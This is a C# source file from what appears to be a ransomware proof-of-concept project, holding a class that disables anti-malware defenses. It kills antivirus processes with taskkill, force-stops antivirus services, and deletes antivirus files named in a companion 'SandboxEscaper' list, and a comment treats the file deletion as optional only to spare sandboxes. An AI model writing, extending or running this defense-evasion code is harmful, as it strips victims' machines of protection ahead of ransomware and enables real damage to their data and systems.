using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

namespace Ilay_sRanomwarePoc
{
    static class AntiMalwareTerminator    //a class that contains the functionality for the aggressive-Mode
    {
        private const bool AntiMalwareFilesRemoval = true;  //you can set false if you dont want to harm the sandboxes




        static public void TerminateAntiMalwarePrograms()
        {
            try
            {
                KillAntiMalwareProcesses();
                TerminateAntiMalwareServices();
                if (AntiMalwareFilesRemoval)
                {
                    DeleteAntiMalwareResources();
                }

            }
            catch
            {
                Console.WriteLine("An Erroe while treminating anti malware programs");
            }



        }

        static public void KillAntiMalwareProcesses()
        {
            foreach (string Process in SandboxEscaper.ProcessesToKill)
            {
                try
                {

                    CommandLineExecution.CommandExecution($"taskkill /IM {Process} ");
                }
                catch
                {
                    Console.WriteLine("Error while killing a process");
                }
            }
        }

        public static void TerminateAntiMalwareServices()
        {
            foreach (string Service in SandboxEscaper.ServicesToKill)
            {
                try
                {
                    CommandLineExecution.CommandExecution($"taskkill /F /FI SERVICES eq {Service}");
                }
                catch
                {
                    Console.WriteLine("An Error while killing a service");
                }
            }
        }


        public static void DeleteAntiMalwareResources()
        {
            foreach (string Resource in SandboxEscaper.ResourcesToDelete)
            {
                try
                {
                    File.Delete(Resource);
                }
                catch
                {
                    Console.WriteLine("An Error while deleting a resource");
                }
            }
        }
    }
}
